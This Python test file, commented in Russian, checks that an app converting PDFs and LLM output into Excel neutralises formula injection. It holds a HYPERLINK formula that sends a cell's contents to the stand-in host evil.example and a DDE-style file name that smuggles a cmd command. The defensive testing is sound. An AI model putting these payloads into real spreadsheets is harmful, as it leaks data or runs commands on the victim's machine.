"""Защита от formula injection: текст из внешних документов не должен становиться формулой Excel."""

from __future__ import annotations

import io
import zipfile

import pymupdf
from openpyxl import load_workbook

from app.services import document_processing as dp
from app.services import registry as rg
from tests.test_pdf_conversion import _draw_table, _text_page

EVIL = '=HYPERLINK("https://evil.example/?d="&A2,"Подробнее")'


def _formula_cells(xlsx: bytes) -> list[str]:
    """Все ячейки, которые Excel счёл бы формулами (элемент <f> в XML листов)."""
    found = []
    with zipfile.ZipFile(io.BytesIO(xlsx)) as z:
        for name in z.namelist():
            if name.startswith("xl/worksheets/sheet"):
                found += [name] * z.read(name).decode("utf-8").count("<f>")
    return found


def _evil_pdf() -> bytes:
    doc = pymupdf.open()
    page = _text_page(doc, "Заявка на поставку")
    _draw_table(page, [["Наименование", "Сумма"], ["Труба", "=1+1"], ["Фланец", "@SUM(A1)"]])
    page.insert_htmlbox(pymupdf.Rect(72, 300, 520, 340), f"<p>{EVIL}</p>")
    return doc.tobytes()


def test_pdf_to_excel_does_not_create_formulas():
    data = dp.parse_pdf(_evil_pdf(), "evil.pdf")
    xlsx = dp.build_xlsx_from_pdf(data)
    assert _formula_cells(xlsx) == []
    ws = load_workbook(io.BytesIO(xlsx)).active
    values = [c.value for row in ws.iter_rows() for c in row if c.value]
    assert "=1+1" in values and "@SUM(A1)" in values  # данные не потеряны
    assert all(c.data_type != "f" for row in ws.iter_rows() for c in row)


class _EvilLLM:
    def extract_fields(self, text, fields):
        return {f["key"]: EVIL for f in fields}


def test_registry_neutralizes_llm_values_and_file_names():
    doc = pymupdf.open()
    _text_page(doc, f"Акт № 1. Подрядчик {EVIL}")
    data = dp.parse_pdf(doc.tobytes(), "=cmd|'/C calc'!A0.pdf")
    result = rg.build_registry([data], ["Подрядчик"], _EvilLLM())
    xlsx = rg.build_registry_xlsx(result)

    assert _formula_cells(xlsx) == []
    ws = load_workbook(io.BytesIO(xlsx)).active
    assert ws["A2"].value.startswith("=cmd") and ws["A2"].data_type == "s"  # имя файла
    assert ws["B2"].value == EVIL and ws["B2"].data_type == "s"  # значение сохранено как текст
    assert ws["B2"].quotePrefix


def test_merge_output_neutralizes_text_cells():
    xlsx = dp.build_xlsx(["Имя", "Заметка"], [["Иван", EVIL], ["Пётр", "+7 900 123-45-67"]])
    assert _formula_cells(xlsx) == []
    ws = load_workbook(io.BytesIO(xlsx)).active
    assert ws["B2"].value == EVIL and ws["B3"].value == "+7 900 123-45-67"


def test_numbers_and_plain_text_are_untouched():
    xlsx = dp.build_xlsx(["Имя", "Количество", "Цена"], [["Иван", 5, 12.5]])
    ws = load_workbook(io.BytesIO(xlsx)).active
    assert ws["B2"].value == 5 and ws["B2"].data_type == "n"
    assert ws["C2"].value == 12.5
    assert not ws["A2"].quotePrefix


def test_registry_page_and_flag_columns_stay_numeric():
    doc = pymupdf.open()
    _text_page(doc, "Акт № 1 на сумму 100 руб.")
    data = dp.parse_pdf(doc.tobytes(), "ok.pdf")
    ws = load_workbook(io.BytesIO(rg.build_registry_xlsx(rg.build_registry([data], ["Номер"], _EvilLLM())))).active
    headers = [c.value for c in ws[1]]
    assert ws.cell(2, headers.index("Стр.") + 1).value == 1
